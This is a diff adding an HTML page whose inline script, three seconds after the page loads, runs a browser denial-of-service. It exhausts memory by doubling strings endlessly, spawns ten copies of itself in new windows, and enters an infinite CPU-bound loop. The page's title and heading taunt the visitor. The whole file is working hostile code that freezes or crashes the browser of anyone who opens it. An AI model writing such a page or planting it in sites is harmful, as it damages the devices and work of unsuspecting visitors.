@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Do not attempt to open me!!!!!!!</title>
+    <script>
+        // Function to recursively consume memory and CPU
+        async function stressTest() {
+            let data = [];
+            let str = " ";
+            let a = 'aaaaa', b = 'bbbbb', c = 'ccccc', d = 'ddddd', e = 'eeeee';
+
+            function recursiveGrowth() {
+                // Exponentially increase memory usage
+                str += str;
+                a += a; b += b; c += c; d += d; e += e;
+                data.push(a, b, c, d, e);
+                
+                // Schedule the next execution to bypass call stack limits
+                setTimeout(recursiveGrowth, 0);
+            }
+
+            // Start recursive memory consumption
+            recursiveGrowth();
+        }
+
+        function openWindows() {
+            // Attempt to open multiple windows (modern browsers may block this)
+            for (let i = 0; i < 10; i++) {
+                window.open(window.location.href, '_blank');
+            }
+        }
+
+        function infiniteLoop() {
+            // CPU-intensive infinite loop to freeze the browser
+            while (true) {
+                console.log(Math.random());
+            }
+        }
+
+        // Start the stress test after a short delay
+        setTimeout(() => {
+            stressTest();
+			stressTest();
+            openWindows();
+            infiniteLoop();
+        }, 3000);
+    </script>
+</head>
+<body>
+    <h1>GET YOUR DEVICE EXPLODED....</h1>
+</body>
+</html>
